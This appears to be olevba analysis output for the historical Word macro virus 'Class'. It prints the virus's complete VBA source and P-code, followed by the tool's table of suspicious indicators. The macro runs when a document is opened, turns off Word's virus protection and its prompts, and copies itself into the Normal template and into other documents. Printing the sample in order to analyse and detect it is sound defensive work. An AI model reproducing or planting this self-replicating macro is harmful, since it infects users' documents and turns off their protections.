olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.bl
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.bl - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'MACRO11/8/99 3:52:35 PMHAVS1
On Error GoTo out
'MACRO11/8/99 3:52:35 PMHAVS1
Options.VirusProtection = False
'MACRO11/8/99 3:52:35 PMHAVS1
Options.SaveNormalPrompt = False
'MACRO11/8/99 3:52:35 PMHAVS1
Options.ConfirmConversions = False
'MACRO11/8/99 3:52:35 PMHAVS1
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'MACRO11/8/99 3:52:35 PMHAVS1
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'MACRO11/8/99 3:52:35 PMHAVS1
If nt > 70 And ad > 0 Then GoTo out
'MACRO11/8/99 3:52:35 PMHAVS1
If nt < 70 Then
'MACRO11/8/99 3:52:35 PMHAVS1
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'MACRO11/8/99 3:52:35 PMHAVS1
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'MACRO11/8/99 3:52:35 PMHAVS1
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'MACRO11/8/99 3:52:35 PMHAVS1
End If
'MACRO11/8/99 3:52:35 PMHAVS1
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'MACRO11/8/99 3:52:35 PMHAVS1
host.codemodule.AddFromFile ("c:\class.sys")
'MACRO11/8/99 3:52:35 PMHAVS1
With host.codemodule
'MACRO11/8/99 3:52:35 PMHAVS1
    For x = 1 To 4
'MACRO11/8/99 3:52:35 PMHAVS1
    .deletelines 1
'MACRO11/8/99 3:52:35 PMHAVS1
    Next x
'MACRO11/8/99 3:52:35 PMHAVS1
End With
'MACRO11/8/99 3:52:35 PMHAVS1
If nt < 70 Then
'MACRO11/8/99 3:52:35 PMHAVS1
    With host.codemodule
'MACRO11/8/99 3:52:35 PMHAVS1
    .replaceline 1, "Sub AutoClose()"
'MACRO11/8/99 3:52:35 PMHAVS1
    .replaceline 71, "Sub ToolsMacro()"
'MACRO11/8/99 3:52:35 PMHAVS1
    End With
'MACRO11/8/99 3:52:35 PMHAVS1
End If
'MACRO11/8/99 3:52:35 PMHAVS1
With host.codemodule
'MACRO11/8/99 3:52:35 PMHAVS1
    For x = 2 To 72 Step 2
'MACRO11/8/99 3:52:35 PMHAVS1
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'MACRO11/8/99 3:52:35 PMHAVS1
    Next x
'MACRO11/8/99 3:52:35 PMHAVS1
End With
'MACRO11/8/99 3:52:35 PMHAVS1
out:
'MACRO11/8/99 3:52:35 PMHAVS1
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'MACRO11/8/99 3:52:35 PMHAVS1
End Sub
'MACRO11/8/99 3:52:35 PMHAVS1

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Class.bl
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4586 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #2:
' 	OnError out 
' Line #3:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #10:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St ad 
' Line #11:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #12:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St nt 
' Line #13:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #14:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #15:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #16:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #17:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #19:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #20:
' 	Ld host 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #21:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #22:
' 	LitStr 0x000C "c:\class.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #23:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #26:
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' 	EndIf 
' Line #27:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #28:
' 	LitStr 0x000C "c:\class.sys"
' 	Paren 
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #29:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #30:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #31:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #32:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #33:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #34:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #35:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #36:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #37:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #38:
' 	EndWith 
' Line #39:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #40:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #41:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #42:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #43:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #44:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #45:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #46:
' 	LitDI2 0x0047 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #47:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #48:
' 	EndWith 
' Line #49:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #52:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #53:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #54:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0048 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #55:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #56:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #57:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #58:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #60:
' 	EndWith 
' Line #61:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #62:
' 	Label out 
' Line #63:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #64:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #65:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #66:
' 	EndSub 
' Line #67:
' 	QuoteRem 0x0000 0x001C "MACRO11/8/99 3:52:35 PMHAVS1"
' Line #68:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

